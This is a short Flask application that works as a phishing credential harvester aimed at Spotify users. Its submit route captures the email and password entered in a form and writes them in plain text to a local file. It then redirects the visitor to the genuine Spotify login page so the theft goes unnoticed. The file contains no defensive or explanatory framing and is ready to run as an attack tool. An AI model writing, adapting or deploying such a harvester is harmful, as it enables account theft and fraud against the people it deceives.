from flask import Flask, request, render_template, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['email']
    password = request.form['password']
    with open('data.txt', 'a') as f:
        f.write(f'Email: {email}, Password: {password}\n')
    return redirect('https://accounts.spotify.com/es/login?continue=https%3A%2F%2Fopen.spotify.com%2Fintl-es')

if __name__ == '__main__':
    app.run(debug=True)


